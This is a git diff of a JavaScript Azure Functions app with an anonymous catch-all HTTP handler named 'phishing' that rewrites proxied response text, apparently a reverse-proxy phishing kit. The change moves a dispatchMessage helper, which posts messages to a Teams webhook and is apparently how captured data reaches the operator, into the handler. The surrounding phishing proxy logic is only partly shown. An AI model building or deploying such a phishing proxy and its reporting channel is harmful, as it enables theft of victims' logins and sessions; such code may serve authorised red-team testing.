@@ -29,30 +29,31 @@ async function replace_response_text(response, upstream, original) {
     .then((text) => text.replace(new RegExp(upstream, "g"), original));
 }
 
-async function dispatchMessage(message) {
-  console.log(message);
-  if (teams_webhook_url) {
-    await fetch(teams_webhook_url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({ text: message }),
-    })
-      .then((response) =>
-        response.ok
-          ? console.log("successfully dispatched MSG")
-          : console.error(`Failed to dispatch: ${response.statusText}`)
-      )
-      .catch((error) => console.log(error));
-  }
-}
-
 app.http("phishing", {
   methods: ["GET", "POST"],
   authLevel: "anonymous",
   route: "/{*x}",
   handler: async (request, context) => {
+
+    async function dispatchMessage(message) {
+      console.log(message);
+      if (teams_webhook_url) {
+        await fetch(teams_webhook_url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ text: message }),
+        })
+          .then((response) =>
+            response.ok
+              ? console.log("successfully dispatched MSG")
+              : console.error(`Failed to dispatch: ${response.statusText}`)
+          )
+          .catch((error) => console.log(error));
+      }
+    }
+
     // original URLs
     const upstream_url = new URL(request.url);
     const original_url = new URL(request.url);
